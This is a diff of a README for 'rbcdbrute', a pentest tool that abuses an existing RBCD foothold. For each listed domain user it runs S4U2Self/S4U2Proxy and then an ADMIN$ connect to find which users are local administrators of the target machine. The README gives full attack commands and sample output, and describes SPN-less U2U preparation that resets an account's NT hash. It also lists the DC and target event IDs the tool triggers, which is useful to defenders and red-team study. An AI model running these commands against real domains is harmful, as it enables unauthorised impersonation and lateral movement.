@@ -1,31 +1,27 @@
 # rbcdbrute
 
-Once you control an account with RBCD rights over a machine, you can impersonate
-anyone on it. `rbcdbrute` turns that into a question worth asking: **which domain
-users are local administrators of that machine?**
+You control an account with RBCD rights over a machine. **Which domain users are
+local admins of it?** `rbcdbrute` answers that, fast.
 
-It runs an S4U2Self + S4U2Proxy exchange per user, then tries to connect to the
-`ADMIN$` share with the resulting service ticket. `ADMIN$` is only reachable by
-local administrators, so a successful tree connect is the answer. Everything is
-pure impacket — no `smbclient`, no external binary, no ticket written to disk.
+For each user it does S4U2Self + S4U2Proxy, then tries an `ADMIN$` tree connect
+with the resulting ticket. `ADMIN$` is admin-only, so a successful connect means
+local admin. Pure impacket: no `smbclient`, no external binary, no ticket on disk.
 
 ## Why
 
-I used to do this with a `for` loop around NetExec, one impersonation per
-iteration. It worked, but on a thousand-user domain it was painfully slow because each
-call re-negotiated everything from scratch. `rbcdbrute` requests the TGT **once**
-and reuses it across a thread pool, so the same run drops from minutes to
-seconds (1007 users in ~13s while testing).
+I did this with a `for` loop around NetExec, one impersonation per iteration. On
+a thousand-user domain it was painfully slow, because every call re-negotiated
+from scratch. `rbcdbrute` gets the TGT **once** and reuses it across a thread
+pool: minutes become seconds (1007 users in ~13s).
 
 ## Prerequisites
 
-RBCD must **already be configured** — this tool exploits it, it does not set it
-up. You need an account whose SID is in the target's
-`msDS-AllowedToActOnBehalfOfOtherIdentity`
+RBCD must already be set up; this tool exploits it, it does not configure it.
+Your account's SID must be in the target's
+`msDS-AllowedToActOnBehalfOfOtherIdentity`. You need reach to the KDC (88/tcp)
+and the target (445/tcp).
 
-You also need network access to the KDC (88/tcp) and to the target (445/tcp).
-
-## Installation
+## Install
 
 ```bash
 git clone https://github.com/nnnnino/rbcdbrute.git
@@ -34,51 +30,115 @@ python3 -m venv venv && source venv/bin/activate
 pip install impacket tqdm
 ```
 
-Tested with impacket 0.13.1 and 0.14.0.dev0, Python 3.11+.
-
 ## Usage
 
 ```
 rbcdbrute.py [options] domain.local/username[:password]
 ```
 
-The positional argument is **your** account, the one RBCD is delegated *from*.
-`-target` is the machine you want to enumerate admins on.
+The positional arg is **your** account (the one RBCD is delegated *from*).
+`-target` is the machine to enumerate, given as a **machine account name**
+(`WK01$`), not an FQDN.
 
 ```bash
 # NT hash
-python3 rbcdbrute.py 'red.local/ATTACKER$' -hashes ':C7A9F9542CC3B79D7FBD56E016F2EEEA' \
+python3 rbcdbrute.py 'red.local/ATTACKER$' -hashes ':C7A9...EEEA' \
   -target 'WK01$' -users users.txt -dc-ip 10.10.100.10
 
 # password (prompted if omitted)
-python3 rbcdbrute.py 'red.local/ATTACKER$':'ATTACKER' \
-  -target 'WK01$' -users users.txt -dc-ip 10.10.100.10
+python3 rbcdbrute.py 'red.local/ATTACKER$':'ATTACKER' -target 'WK01$' -users users.txt -dc-ip 10.10.100.10
 
 # existing ccache
-export KRB5CCNAME=attacker.ccache
-python3 rbcdbrute.py 'red.local/ATTACKER$' -k -no-pass \
-  -target 'WK01$' -users users.txt -dc-ip 10.10.100.10
-
-# AES key
-python3 rbcdbrute.py 'red.local/ATTACKER$' -aesKey <hex> \
+KRB5CCNAME=attacker.ccache python3 rbcdbrute.py 'red.local/ATTACKER$' -k -no-pass \
   -target 'WK01$' -users users.txt -dc-ip 10.10.100.10
 ```
 
-`-target` takes the **machine account name** (`WK01$`), not an FQDN. The FQDN is
-rebuilt from the realm to form the SPN, and resolved via DNS unless `-target-ip`
-is given.
+`-aesKey <hex>` also works. The FQDN is built from the realm for the SPN and
+resolved via DNS unless you pass `-target-ip`.
 
-## Detection footprint
+### Example
 
-This is loud. Each user produces a `4769` (Kerberos service ticket requested) on
-the DC, with the transited-services field populated the signature of S4U. A
-thousand users in thirty seconds is not subtle, and the `ADMIN$` connections
-land as `5140` on the target. Run it knowing that.
+```bash
+python3 rbcdbrute.py 'red.local'/'ATTACKER$':'ATTACKER' -target 'WK01$' -users users.txt -dc-ip 10.10.100.10
+
+[*] Authentication
+    account   ATTACKER$@RED.LOCAL
+    method    password -> AS-REQ
+    KDC       10.10.100.10
+    TGT       OK
+
+[*] Target
+    host      WK01.red.local (10.10.100.11:445)
+    SPN       cifs/WK01.red.local
+    check     S4U2Self + S4U2Proxy, then ADMIN$ tree connect
+    SPN check OK
+
+[*] Run
+    users     1007
+    threads   20
+    timeout   10s  (SMB)
+    output    stdout only (-o FILE to save)
+
+[+] ADMIN    nnino
+[+] ADMIN    Administrator
+
+-------------------------- Summary --------------------------
+       2  admins    local administrators of the target
+      72  no ticket not delegatable, disabled, locked out or expired
+       3  unknown   no such principal in the realm
+       0  errors    unexpected failures
+    1007  checked   out of 1007 in 12.8s  (79 users/s)
+
+  no ticket breakdown:
+       40x  KDC_ERR_BADOPTION
+       32x  KDC_ERR_CLIENT_REVOKED
+
+  (-v lists them live, -errors-file FILE writes them out)
+
+  Local admins (-o FILE to save them)
+    + nnino
+    + Administrator
+```
+
+## SPN-less controlled account (`-u2u`)
+
+If the account you control has no SPN, plain S4U2Self can't get you a usable
+ticket. The workaround is U2U: request the S4U2Self ticket sealed in your own
+TGT session key (`enc-tkt-in-skey`), after setting the account's NT hash to that
+same session key so the KDC can decrypt it again at S4U2Proxy.
+
+Do the one-time prep out of band (see
+[the hacker recipes](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd#rbcd-on-spn-less-users)):
+
+```bash
+# TGT, and its session key
+getTGT.py -hashes ":$(pypykatz crypto nt "$PASSWORD")" "$DOMAIN/$USER"
+describeTicket.py "$USER.ccache" | grep 'Ticket Session Key'
+
+# set the account's NT hash to that session key
+changepasswd.py -newhashes :TGTSessionKey "$DOMAIN/$USER:$PASSWORD"@"$DC_HOST"
+```
+
+Then point rbcdbrute at that **same** ccache with `-u2u`:
+
+```bash
+KRB5CCNAME="$USER.ccache" python3 rbcdbrute.py "$DOMAIN/$USER" -u2u -k -no-pass \
+  -target 'WK01$' -users users.txt -dc-ip 10.10.100.10
+```
+
+`-u2u` requires the ccache TGT (`-k`): the ticket is sealed with *that* TGT's
+session key, so a freshly requested one would not match the NT hash you set and
+S4U2Proxy would fail. The tool refuses any other auth path in this mode.
+
+## Detection
+
+Loud. Every user is a `4769` on the DC with the transited-services field set (the
+S4U tell); admin hits are `5140` on the target. Run it knowing that.
 
 ## Notes
 
-- Only the local Administrators membership is probed; nothing is written to the target and no command is executed on it.
-- Tickets stay in memory. Use `getST.py` if you want one on disk.
-- `-threads` above ~30 tends to produce timeouts rather than speed.
+- Only local Administrators membership is probed. Nothing is written or run on the target.
+- Tickets stay in memory; use `getST.py` if you want one on disk.
+- `-threads` above ~30 tends to give timeouts, not speed.
 
 > Use only against systems you are authorised to test.
